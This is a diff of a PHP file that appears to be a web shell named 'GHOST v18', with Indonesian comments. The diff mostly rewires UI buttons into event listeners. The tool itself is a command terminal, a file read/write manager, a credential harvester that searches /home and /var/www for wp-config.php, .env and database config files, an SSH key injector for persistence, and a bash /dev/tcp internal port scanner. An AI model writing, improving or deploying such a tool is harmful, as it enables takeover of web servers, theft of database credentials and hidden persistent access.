@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - section 0..6: Full UI, Fix JSON, Advanced DB, Deep Scan.
+// GHOST v18 - section 0..6: Full UI (Event Listener Based), Fix JSON.
 
-define('GH_VER',      '18.0.0-final');
+define('GH_VER',      '18.0.0-final-fix');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -285,7 +285,6 @@ function gh_db_harvest() {
     $logs = array(); $info = array();
     
     $logs[] = "[*] Scanning config via find (seluruh server)...";
-    // Scan /home dan /var/www untuk config
     $find_res = gh_exec_adv("find /home /var/www -maxdepth 4 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' -o -name 'db.php' \\) 2>/dev/null");
     
     $found_configs = array();
@@ -400,9 +399,8 @@ function gh_ssh_action($action, $key) {
 // ==== SECTION 5: PORT SCAN (FIXED) & CVE PROFILER ===========================
 function gh_port_scan($target = '127.0.0.1') {
     $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
-    $port_str = implode(' ', $ports);
     
-    // Trik Port Scan paling cepat & aman: pakai Bash /dev/tcp via exec
+    // Bash /dev/tcp trik. Jauh lebih stabil dari PHP fsockopen di LiteSpeed.
     $bash_script = '';
     foreach ($ports as $p) {
         $bash_script .= " (echo > /dev/tcp/$target/$p) >/dev/null 2>&1 && echo \"$p\";";
@@ -542,11 +540,11 @@ function gh_ui() {
 </div>
 
 <div class="tabs">
-    <button class="tab-btn active" onclick="switchTab('tab-term', this)">Terminal</button>
-    <button class="tab-btn" onclick="switchTab('tab-scan', this)">Deep Scanner</button>
-    <button class="tab-btn" onclick="switchTab('tab-vuln', this)">Vulnerability</button>
-    <button class="tab-btn" onclick="switchTab('tab-db-ssh', this)">DB & SSH</button>
-    <button class="tab-btn" onclick="switchTab('tab-profile', this)">Profile & Port</button>
+    <button class="tab-btn active" id="btn-tab-term" onclick="switchTab('tab-term', this)">Terminal</button>
+    <button class="tab-btn" id="btn-tab-scan" onclick="switchTab('tab-scan', this)">Deep Scanner</button>
+    <button class="tab-btn" id="btn-tab-vuln" onclick="switchTab('tab-vuln', this)">Vulnerability</button>
+    <button class="tab-btn" id="btn-tab-db-ssh" onclick="switchTab('tab-db-ssh', this)">DB & SSH</button>
+    <button class="tab-btn" id="btn-tab-profile" onclick="switchTab('tab-profile', this)">Profile & Port</button>
 </div>
 
 <!-- TAB: TERMINAL -->
@@ -554,16 +552,16 @@ function gh_ui() {
     <div class="box">
         <div id="term"><div class="term-line"><span class="dim">Welcome.</span></div></div>
         <div class="row" style="margin-top:8px;">
-            <input type="text" id="cmd" placeholder="whoami" style="flex:1;" onkeydown="if(event.key==='Enter')execCmd()">
-            <button onclick="execCmd()">Exec</button>
+            <input type="text" id="cmd" placeholder="whoami" style="flex:1;">
+            <button id="btn-exec">Exec</button>
         </div>
     </div>
     <div class="box">
         <h2>File Manager</h2>
         <div class="row">
             <input type="text" id="f-path" placeholder="/path/to/file" style="flex:1;">
-            <button onclick="readFile()">Read</button>
-            <button onclick="writeFile()" style="border-color:#ff0;color:#ff0;">Write</button>
+            <button id="btn-read">Read</button>
+            <button id="btn-write" style="border-color:#ff0;color:#ff0;">Write</button>
         </div>
         <pre id="f-out" style="margin-top:8px;">Ready.</pre>
     </div>
@@ -574,7 +572,7 @@ function gh_ui() {
     <div class="box">
         <h2>Heuristic File Scanner</h2>
         <div class="row">
-            <button onclick="startScan()">Start Scan</button>
+            <button id="btn-scan">Start Scan</button>
             <span id="scan-status" class="dim">Idle.</span>
         </div>
         <div id="scan-results"></div>
@@ -585,7 +583,7 @@ function gh_ui() {
 <div id="tab-vuln" class="tab-content">
     <div class="box">
         <h2>Vulnerability Explorer</h2>
-        <div class="row"><button onclick="vulnScan()">Scan Vulnerabilities</button></div>
+        <div class="row"><button id="btn-vuln">Scan Vulnerabilities</button></div>
         <div id="vuln-results"></div>
     </div>
 </div>
@@ -595,17 +593,17 @@ function gh_ui() {
     <div class="grid">
         <div class="box">
             <h2>DB Harvester</h2>
-            <div class="row"><button onclick="dbHarvest()">Scan & Connect</button></div>
+            <div class="row"><button id="btn-db">Scan & Connect</button></div>
             <pre id="db-out" style="margin-top:8px;">Ready.</pre>
         </div>
         <div class="box">
             <h2>SSH Manager</h2>
-            <div class="row"><button onclick="sshScan()">Scan SSH</button></div>
+            <div class="row"><button id="btn-ssh">Scan SSH</button></div>
             <pre id="ssh-out" style="margin-top:8px;">Ready.</pre>
             <div class="row" style="margin-top:8px;">
                 <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="flex:1;">
-                <button onclick="sshAct('inject')">Inject</button>
-                <button onclick="sshAct('clean')" style="border-color:#f00;color:#f00;">Clean</button>
+                <button id="btn-ssh-inject">Inject</button>
+                <button id="btn-ssh-clean" style="border-color:#f00;color:#f00;">Clean</button>
             </div>
         </div>
     </div>
@@ -616,14 +614,14 @@ function gh_ui() {
     <div class="grid">
         <div class="box">
             <h2>Target Profiler & CVE</h2>
-            <div class="row"><button onclick="cveProfile()">Analyze Stack & CVE</button></div>
+            <div class="row"><button id="btn-cve">Analyze Stack & CVE</button></div>
             <div id="cve-out" style="margin-top:8px;">Ready.</div>
         </div>
         <div class="box">
             <h2>Internal Port Scanner</h2>
             <div class="row">
                 <input type="text" id="port-target" value="127.0.0.1" style="flex:1;">
-                <button onclick="portScan()">Scan Ports</button>
+                <button id="btn-port">Scan Ports</button>
             </div>
             <pre id="port-out" style="margin-top:8px;">Ready.</pre>
         </div>
@@ -631,13 +629,34 @@ function gh_ui() {
 </div>
 
 <script>
+// Ganti event onclick inline jadi Event Listener biar gak crash
+document.addEventListener('DOMContentLoaded', () => {
+    document.getElementById('btn-exec').onclick = execCmd;
+    document.getElementById('cmd').onkeydown = e => { if(e.key==='Enter') execCmd(); };
+    document.getElementById('btn-read').onclick = readFile;
+    document.getElementById('btn-write').onclick = writeFile;
+    document.getElementById('btn-scan').onclick = startScan;
+    document.getElementById('btn-vuln').onclick = vulnScan;
+    document.getElementById('btn-db').onclick = dbHarvest;
+    document.getElementById('btn-ssh').onclick = sshScan;
+    document.getElementById('btn-ssh-inject').onclick = () => sshAct('inject');
+    document.getElementById('btn-ssh-clean').onclick = () => sshAct('clean');
+    document.getElementById('btn-cve').onclick = cveProfile;
+    document.getElementById('btn-port').onclick = portScan;
+});
+
 function switchTab(id, btn) {
     document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
     document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     btn.classList.add('active');
 }
-function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function esc(s){ 
+    if(s === null || s === undefined) return '';
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); 
+}
+
 async function api(act, data={}) {
     const body = new URLSearchParams(); body.append('act', act);
     for (let k in data) body.append(k, data[k]);
